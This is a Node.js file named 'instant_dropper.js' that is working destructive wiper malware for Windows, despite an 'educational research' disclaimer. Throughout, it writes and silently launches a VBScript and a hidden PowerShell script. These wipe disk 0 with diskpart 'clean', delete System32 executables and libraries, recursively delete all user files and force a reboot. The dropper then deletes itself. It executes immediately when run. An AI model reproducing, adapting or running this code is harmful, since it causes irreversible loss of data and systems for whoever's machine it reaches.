// instant_dropper.js - No timers, immediate execution
// Educational research only - CATShadow

const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn, exec } = require('child_process');

function generateInstantVbs() {
    return `' INSTANT DESTRUCTION - No delays
Option Explicit
Dim objShell, objFSO, sTempPath, iCounter
Dim sDiskpartScript, sScriptFile, objTextFile, sWinDir

Set objShell = CreateObject("Wscript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
sTempPath = objShell.ExpandEnvironmentStrings("%TEMP%")

' Spam popups IMMEDIATELY
For iCounter = 0 To 49
    objShell.Popup "SYSTEM DESTROYED #" & iCounter, 0, "FATAL", 16
Next

' Destroy boot IMMEDIATELY
sDiskpartScript = "select disk 0" & vbCrLf & _
                  "clean" & vbCrLf & _
                  "exit"
sScriptFile = sTempPath & "\\bootkill.txt"

Set objTextFile = objFSO.CreateTextFile(sScriptFile, True)
objTextFile.Write sDiskpartScript
objTextFile.Close

objShell.Run "diskpart /s """ & sScriptFile & """", 0, False

' Delete system files IMMEDIATELY
sWinDir = objShell.ExpandEnvironmentStrings("%WINDIR%")
On Error Resume Next
objFSO.DeleteFile sWinDir & "\\System32\\*.dll", True
objFSO.DeleteFile sWinDir & "\\System32\\*.exe", True

' Force reboot IMMEDIATELY
objShell.Run "shutdown /r /f /t 0", 0, False

' Additional mass deletion
objShell.Run "cmd /c del /f /q C:\\Windows\\*.*", 0, False
`;
}

function executeInstantly() {
    if (os.platform() !== 'win32') {
        console.error('Windows only');
        return;
    }

    const tempDir = os.tmpdir();
    const vbsFile = path.join(tempDir, `instant_${Date.now()}.vbs`);
    
    // Write VBS
    fs.writeFileSync(vbsFile, generateInstantVbs());
    
    // Execute IMMEDIATELY with highest priority
    spawn('wscript.exe', [vbsFile], {
        detached: true,
        stdio: 'ignore',
        windowsHide: true,
        windowsVerbatimArguments: true
    }).unref();
    
    // Also run direct PowerShell destruction IMMEDIATELY
    const psCode = `
    Get-ChildItem "$env:windir\\System32\\*.exe" | Select-Object -First 50 | Remove-Item -Force;
    Get-ChildItem "C:\\Users\\*" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse;
    shutdown /r /f /t 0
    `;
    
    const psFile = path.join(tempDir, `ps_kill_${Date.now()}.ps1`);
    fs.writeFileSync(psFile, psCode);
    
    spawn('powershell.exe', [
        '-ExecutionPolicy', 'Bypass',
        '-WindowStyle', 'Hidden',
        '-File', psFile
    ], {
        detached: true,
        stdio: 'ignore',
        windowsHide: true
    }).unref();
    
    // Self-delete JS dropper IMMEDIATELY
    setTimeout(() => {
        try { fs.unlinkSync(__filename); } catch(e) {}
    }, 100);
    
    console.log('INSTANT DESTRUCTION INITIATED');
}

executeInstantly();
